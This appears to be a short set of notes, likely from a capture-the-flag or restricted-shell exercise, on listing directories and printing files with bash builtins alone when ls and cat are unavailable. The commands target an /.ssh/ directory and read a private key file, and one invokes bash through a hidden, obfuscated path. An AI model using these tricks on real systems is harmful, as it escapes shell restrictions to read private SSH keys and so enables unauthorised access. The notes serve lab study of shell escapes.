
# Only core bash functions

## List directory content.
array=(/.ssh/*) ; for entry in "${array[@]}"; do "$entry"; done

## Print file content.
array=("$(<.ssh/fenrir.ls.priv)") ;for entry in "${array[@]}"; do "$entry"; done



# Alternate if access to bash elf
/.YV9zZWNyZXRfYmlu/bash --norc --noprofile

## List
echo /.ssh/*

## Read
echo "$(</.ssh/fenrir.ls.priv)"
